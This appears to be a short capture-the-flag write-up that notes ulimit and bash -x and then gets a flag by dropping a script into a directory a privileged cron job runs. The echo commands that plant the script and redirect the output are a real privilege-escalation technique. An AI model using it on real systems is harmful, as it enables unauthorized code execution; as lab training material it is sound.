ulimit = user limits, limit the use of system-wide resources.
-t : maximum amount of cpu time in seconds.
Invoking a Bash shell with the -x option causes each shell command to be printed before it is executed. This is especially useful for diagnosing problems with installation shell scripts.


-> This script will execute everything that is located in /opt/openarenaserver/
We need to put the getflag command in a script that will be executed in /opt/openarenaserver

$> echo /bin/getflag > /opt/openarenaserver/test
Nothing happends, as there is no print in the cronjob script
We need to redirect the result in a file.

$> echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/test
$> cat /opt/openarenaserver/test
/bin/getflag > /tmp/flag
WAIT...
$> cat /tmp/flag
